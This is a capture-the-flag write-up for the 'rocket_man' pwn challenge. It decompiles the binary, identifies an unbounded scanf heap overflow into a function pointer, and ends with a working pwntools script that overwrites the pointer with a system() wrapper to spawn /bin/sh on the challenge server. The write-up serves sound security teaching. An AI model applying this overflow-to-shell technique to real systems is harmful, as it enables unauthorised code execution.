# Challenge Description
---

Author: niktay

Let's launch some rockets and go to the moon! 🐶🚀

[rocket_man](rocket_man)

# Identifying the Vulnerability

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Looking at the binary protections, we see that everything except PIE is enabled.

Let's run this binary and have a look at how it roughly works.

[![asciicast](https://asciinema.org/a/YOyukwJJ3AwlBAc53GyzWADD8.svg)](https://asciinema.org/a/YOyukwJJ3AwlBAc53GyzWADD8)
From the video above, we can see that the program introduces 2 variables, one is **rocket_name** and the other is **pilot_name** both of which are initialized and can be modified freely by the player. Once both of these variables are initialized, then the **launch_rocket** function becomes available for the player and the program then ends.

Let's now decompile it and have a look at what is going on under the hood. 

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // er8
  int v6; // er9
  int v7; // edx
  int v8; // ecx
  int v9; // er8
  int v10; // er9
  int v11; // edx
  int v12; // ecx
  int v13; // er8
  int v14; // er9
  int v15; // edx
  int v16; // ecx
  int v17; // er8
  int v18; // er9
  int opt; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v20; // [rsp+8h] [rbp-8h]

  v20 = __readfsqword(0x28u);
  setup_IO(argc, argv, envp);
  
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
      
        opt = 0;
        argv = (const char **)&opt;
        __isoc99_scanf("%d", &opt);
        
        if ( opt != 2 )
          break;
        if ( LICENSE )
          update_pilot_name((__int64)"\x1B[2J\x1B[H", (__int64)&v19, v15, v16, v17, v18);
        else
          generate_pilot_license();
      }
      if ( opt == 3 )
        break;
      if ( opt != 1 )
        exit(0);
      if ( ROCKET )
        update_rocket_name();
      else
        order_rocket();
    }
    if ( !LICENSE || !ROCKET )
      exit(0);
    (*(void (__fastcall **)(__int64))(ROCKET + 64))(LICENSE + 4);
  }
}
```

After cleaning up the code a little, we have this nice code.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
	v20 = __readfsqword(0x28u);
	setup_IO(argc, argv, envp);

	int opt = 0;
	scanf("%d", &opt);

	switch (opt) {

		case 1:
			if ( ROCKET ) {
		        update_rocket_name();
		    }
		    else {
		        order_rocket();
			}
			
		case 2:
			if ( LICENSE ) {
				update_pilot_name();
			}
	        else {
		        generate_pilot_license();
			}
			
		case 3:
			if ( !LICENSE || !ROCKET ) {
				exit(0);
			}
			else {
				(*(ROCKET + 64))(LICENSE + 4); // <----- (1)
			}

		default:
			exit(0);

	}
}

unsigned __int64 generate_pilot_license()
{
  unsigned int v0; // eax
  int v1; // eax
  int v2; // er8
  int v3; // er9
  _DWORD *v5; // [rsp+0h] [rbp-10h]
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v0 = time(0LL);
  srand(v0);
  v5 = malloc(0x44uLL);
  v1 = rand();
  *v5 = v1 % 31337;
  cprintf(7, (unsigned int)"Pilot Name: ", (_DWORD)v5, v1 % 31337, v2, v3);
  __isoc99_scanf("%s", v5 + 1);
  LICENSE = (__int64)v5;
  return __readfsqword(0x28u) ^ v6;
}

unsigned __int64 __fastcall update_pilot_name(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  unsigned __int64 v7; // [rsp+8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  cprintf(7, (unsigned int)"Pilot Name: ", a3, a4, a5, a6);
  __isoc99_scanf("%s", LICENSE + 4); // <----- (2)
  return __readfsqword(0x28u) ^ v7;
}

unsigned __int64 order_rocket()
{
  char *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v0 = (char *)malloc(0x48uLL);
  strcpy(v0, "GENERIC UNTITLED ROCKET");
  *((_QWORD *)v0 + 8) = blast_off; // <----- (3)
  ROCKET = (__int64)v0;
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 __fastcall update_rocket_name(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  unsigned __int64 v7; // [rsp+8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  cprintf(7, (unsigned int)"Rocket Name: ", a3, a4, a5, a6);
  __isoc99_scanf("%63s", ROCKET);
  return __readfsqword(0x28u) ^ v7;
}

unsigned __int64 __fastcall for_internal_use_only(const char *a1)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  system(a1);
  return __readfsqword(0x28u) ^ v2;
}
```

As you can see, in the main function, we are given with a very nice menu to initialize our **ROCKET** and **LICENSE** as well as rename our **PILOT** and **ROCKET**. At the end of the program if we _launch the rocket_, it calls a function directly from a function pointer as u can see at **(1)**.

If we look inside these functions, we notice that these **PILOT_NAME** and **ROCKET_NAME** variable are actually `malloc`'ed and are stored in the heap.

On initializing **rocket_name**, it will place a pointer to the **blastoff** function relative to the chunk storing the rocket_name which is used to call **blastoff** with an argument from **LICENSE+4** at the end of the program as you can see at **(3)**.

As for our **pilot_name**, we notice that it is actually vulnerable to buffer overflow because there is no size of input specified in the format string as you can see at **(2)**.

Lastly, we notice theres a function called **for_internal_use_only** which basically takes in an argument and runs it as a command using the **system** function. This could be useful to give us a shell if we are somehow able to run the function.

# Exploitation Walkthrough

Essentially, if we are able to use our buffer overflow in the **pilot_name** to overwrite the function pointer to **blastoff** and change it to **for_internal_use_only** we can probably run a system command to get shell.

This means that we have to obtain our pilot license before we order the rocket so that the LICENSE will be allocated first and when we overflow LICENSE, we will be able to write into the chunk allocated for the rocket name and hence overwrite the function pointer. 

1. Obtain Pilot License
2. Order Rocket
3. Edit Pilot Name to overflow into rocket and overwrite function pointer
4. Blast off! (and get shell)

## Exploit Script

```python
# coding: utf-8
from pwn import *

context.binary = elf = ELF('./rocket_man')
# p = process('./rocket_man')
p = remote('challenges1.whitehacks.xyz', 53901)


p.sendline("2") # obtain pilot license
p.sendline("1") # placeholder pilot name
p.sendline("1") # order rocket
p.sendline("2") # modify pilot name

# overflow function pointer and parse /bin/sh as argument
p.sendline(b"/bin/sh;" + b"B"*132 + p64(elf.sym.for_internal_use_only))

# run internal_use_only and get shell
p.sendline("3")

p.interactive()

```